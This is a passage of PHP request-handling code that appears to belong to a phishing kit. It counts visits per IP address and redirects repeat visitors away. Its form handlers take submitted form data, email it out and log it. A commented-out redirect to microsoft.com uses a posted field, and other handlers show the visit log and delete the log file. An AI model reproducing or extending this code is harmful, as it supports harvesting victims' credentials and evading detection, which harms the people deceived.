                    $ipaddress = mj_get_ip(); //$_SERVER['REMOTE_ADDR'];
                    $qstr = (!empty($_SERVER['QUERY_STRING']) ? "?{$_SERVER['QUERY_STRING']}" : "");
                    

                    // Get form step

                    $bn = '';
                    foreach($all_visit_data as $a_v_data)
                    {
                        if(in_array($ipaddress, $a_v_data))
                        {
                            $s_data = $a_v_data['6'];
                            $url_components = parse_url($s_data); 
                            if(!empty($url_components['query']))
                            {
                                parse_str($url_components['query'], $params);
                                $bn = basename($params['s']);

                                // if it is base64 then decode it
                                $is_b64 = base64_decode($bn, true);
                                if($is_b64)
                                {
                                    $bn = basename($is_b64);
                                }
                            }

                            // if($bn == $visit_limit_step)
                            if(preg_match("@$visit_limit_step@", $bn))
                            {
                                break;
                            }
                            // echo $bn.' <br/>';
                        }
                    }


                    // Verify visit counts

                    $visit_count = mj_count_visits($all_visit_data, $ipaddress);

                    // if($visit_count >= $visit_limit && $bn == $visit_limit_step)
                    // if($visit_count >= $visit_limit && preg_match("@$visit_limit_step@", $bn))
                    if($visit_count >= $visit_limit && preg_match("@(_suspicious|$visit_limit_step)@", $bn))
                    {
                        // Redirect
                        // echo 'Visits Exusted. '.$visit_count;
                        // $redirect_to_url = 'https://the-domain.com/';
                        mj_redirect_js($redirect_to_url);
                        exit();
                    }
                } 
            }
            
            echo mj_load_view();
            
            break;
            
        case'form1':
        case'form2':
        case'form3':
        case'form4':
        case'form5':
        case'xxx_form':

            //echo 'Form Data '.mj_return_pre($post_array);
            
            $mj_messg = mj_build_message($post_array); 
            mj_do_mail($mj_messg);
            mj_log_data($mj_messg);
            
            //echo '<meta http-equiv="refresh" content="1;url=https://www.microsoft.com/'.$post_array['Editbox2'].'"/>';

            break;

        case'vt':
        case's':
            mj_log_visits();
            break;
        
        case'visits':
            mj_load_visit_log();
            break;
        
        case'rlf':
            echo mj_remove_log_file() ? ':)' : ':(';
            break;
        
        default:
            echo 'INVALID REQUEST: I can not understand your request.';    
    }
}